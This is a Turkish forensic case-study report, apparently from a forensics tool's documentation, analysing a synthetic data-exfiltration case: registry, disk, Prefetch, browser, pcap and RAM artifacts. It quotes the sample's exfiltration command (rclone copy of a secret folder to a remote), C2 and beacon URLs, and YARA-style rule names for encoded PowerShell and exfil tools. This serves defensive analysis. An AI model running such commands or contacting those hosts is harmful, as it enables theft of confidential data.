# Örnek Vaka İncelemesi: VAK-2026-084 (Şüpheli Bilgisayar & Veri Sızdırma Analizi)

Bu rapor, sistemin yalnızca birim testlerinde değil **uçtan uca gerçekçi bir adli inceleme senaryosunda** hangi bulguları çıkarabildiğini, bu bulguların diğer modüllerle nasıl doğrulandığını ve üretilen çıktıları belgelemektedir. Senaryo ve gerçek Windows 11 doğrulaması [scripts/run_real_investigation.py](../scripts/run_real_investigation.py) tarafından tekrarlanabilir biçimde yürütülmüştür.

---

## 1. İnceleme Kapsamı ve Çıktı Dosyaları

- **Soruşturma Vakası:** `VAK-2026-084 — Yetkisiz Veri Sızdırma ve Şüpheli Payload İncelemesi`
- **İncelenen İkili & SQLite Delil Paketi:** [examples/suspect_pc_case/](../examples/suspect_pc_case/)
- **Canlı Sistem Çapraz Doğrulaması (Windows 11):** PowerShell `Get-FileHash`, `winreg` (`Run`, `Services`, `ProfileList`, `TypedPaths`, `UserAssist`, `ShimCache`, `USBSTOR`) ve Win32 `Toolhelp32`.
- **Üretilen Rapor & Dışa Aktarımlar:**
  - Yapılandırılmış Bulgular: [investigation_findings.json](../outputs/vak_2026_084/investigation_findings.json)
  - Denetlenebilir HTML Rapor: [adli_rapor_vak_2026_084.html](../outputs/vak_2026_084/adli_rapor_vak_2026_084.html)
  - PDF Bilirkişi Raporu: [adli_rapor_vak_2026_084.pdf](../outputs/vak_2026_084/adli_rapor_vak_2026_084.pdf)
  - CASE / UCO JSON-LD Paketi: [vak_2026_084_case_uco.json](../outputs/vak_2026_084/vak_2026_084_case_uco.json)
  - Timesketch JSONL Zaman Çizelgesi: [vak_2026_084_timeline.jsonl](../outputs/vak_2026_084/vak_2026_084_timeline.jsonl)
  - Sleuth Kit 11-Sütun BodyFile: [vak_2026_084_bodyfile.txt](../outputs/vak_2026_084/vak_2026_084_bodyfile.txt)

---

## 2. Somut Tespitler: Şüpheli Bilgisayarda Neler Bulundu?

### A. Kriptografik Bütünlük & Canlı Makine Doğrulaması
- Delil disk imajı (`suspect_usb_disk.dd`) üzerinde `IntegrityService.compute_dual_hashes()` tarafından hesaplanan SHA-256 özeti (`5cb9d12cb338c6a1ce48456df2f71a5218a8ee276cdc56faece12ed5aa166bc1`), bağımsız Windows PowerShell `Get-FileHash` çıktısıyla **birebir eşleşti (`hash_cross_verification_matched: true`)**.
- Canlı Windows 11 sisteminde **5** `Run/RunOnce` kaydı, **131** servis, **4** kullanıcı profili, **5** `TypedPaths`, **129** ROT13 `UserAssist` girdisi, **150** `ShimCache` kaydı, **1** gerçek `USBSTOR` aygıtı (`Kingston DataTraveler 3.0`, Seri: `E0D55EA57410E9B159D80011&0`) ve **222** aktif süreç tespit edildi.

### B. Disk & Silinen Dosya İzleri (`suspect_usb_disk.dd`)
- RAW MBR/NTFS disk imajında **1** NTFS bölümü (`$MFT`), **5** aktif kayıt ve silinmiş olarak işaretlenmiş **2** dosya kaydı (`\Users\silinen_kanit.jpg` ve `\Users\silinen_betik.ps1`) çözümlendi.
- İmza tabanlı ham dosya kurtarma (**File Carving**) ile ayrılmamış/veri alanından **3** gömülü dosya imzası tespit edildi.

### C. Windows Çalıştırma, Silme ve Harici Medya İzleri
- **`Security.evtx` (ElfFile + BinXml):** **5** Windows güvenlik olayı çözümlendi (oturum açma, süreç oluşturma vb.).
- **`.lnk` & OLE2 Jump List (`AutomaticDestinations`):** Şüphelinin harici sürücü üzerindeki `E:\Exfil\musteri_listesi.zip` (`1,048,576 B`) arşivine eriştiğini gösteren kısayol ve Jump List akışları çıkarıldı.
- **Prefetch (`.pf`):** `POWERSHELL.EXE` ikilisinin **7 kez** çalıştırıldığı ve Prefetch hash'inin `0xA1B2C3D4` olduğu saptandı.
- **Geri Dönüşüm Kutusu (`$I`):** `C:\Users\AhmetK\Desktop\gizli_maas_tablosu.xlsx` (`245,760 B`) dosyasının silinerek ortadan kaldırılmaya çalışıldığı görüldü.

### D. Uzantı Sahteciliği & YARA Tehdit Taraması (`tatil_fatura_ek.jpg`)
- Dosya adı görsel (`.jpg`) olmasına rağmen **Magic-Byte imza incelemesi** dosyanın gerçekte **`PE Executable (EXE/DLL)`** (`4D 5A ... PE\0\0`) olduğunu ortaya koydu (`extension_mismatch: true`, SHA-256: `72bd4e5f789cb93e98fa06cdd348a8f19d1d300cd72007143a5c66ff6a479d63`).
- Yerleşik **YARA-Stili Tarayıcı** dosya içerisinde iki kritik kural eşleşmesi yakaladı:
  1. `PowerShell_EncodedCommand` (gizli pencere ve Base64 kodlu komut çalıştırma)
  2. `Suspicious_Exfil_Tools` (`rclone copy C:\GizliProjeler remote_exfil:drop` komutu ve `http://185.220.101.42/exfil/gate.php` adresi)

### E. Tarayıcı, E-posta, Ağ (`.pcap`) ve RAM Dökümü Korelasyonu
- **Tarayıcı (`Chrome_History.sqlite`):** `usb data exfiltration powershell` arama sorgusu, `https://transfer.example-cloud.test/upload` yükleme portalı ziyareti ve `rclone-v1.68-windows-amd64.zip` indirme kaydı doğrulandı.
- **Ağ (`.pcap`) & E-posta (`.eml`):** Ağ paketlerinde `exfil.evil-c2.example` DNS sorgusu ile `/stage2.bin` / `c2-drop.example` HTTP IOC kalıntıları; `.eml` dosyasında ise `"Acil Fatura Onayi - Q4 Exfil"` konulu ve `fatura_ek.zip` ekli ileti saptandı.
- **RAM Bellek Dökümü (`suspect_memory.dmp`, `PAGEDU64`):** `KDBG` (`0x00001000`), bellek içi `MZ/PE` modülü, `beacon_svc.exe` `EPROCESS` havuz adayı ve `http://198.51.100.42:8080/beacon.bin` IOC adresi belirlendi.

---

## 3. Adli Bilişim Değerlendirmesi ve Sınırlamalar (SWGDE 18-F-001)
1. **Ne Anlama Gelir?** Tek bir tarayıcı kaydı veya `.lnk` dosyası kişinin suç işlediğini tek başına kanıtlamaz; ancak **USBSTOR cihaz izi + silinen hassas Excel (`$I`) + `E:\Exfil\musteri_listesi.zip` Jump List hedefi + `rclone` indirmesi + uzantısı gizlenmiş MZ/PE yükü + RAM `beacon_svc.exe` IOC'leri** bir araya geldiğinde veri sızdırma zinciri teknik olarak yüksek tutarlılıkla doğrulanır.
2. **Sınırlamalar:**
   - RAM dökümündeki `Proc` adayları heuristik taramaya dayanır; tam çekirdek sembol çözümlemesi (PDB) gerektiren olgularda dış **Volatility 3** köprüsü (`VolatilityBridge`) ile desteklenmelidir.
   - Bu örnek vakada incelenen disk, EVTX, kovan, tarayıcı ve RAM imajları tekrarlanabilirlik için [examples/suspect_pc_case/](../examples/suspect_pc_case/) altında ikili/SQLite formatında üretilmiş kontrollü adli vaka setidir; canlı Windows 11 donanım/kayıt defteri testleri ise [REAL_WORLD_VALIDATION.md](REAL_WORLD_VALIDATION.md) belgesindedir.
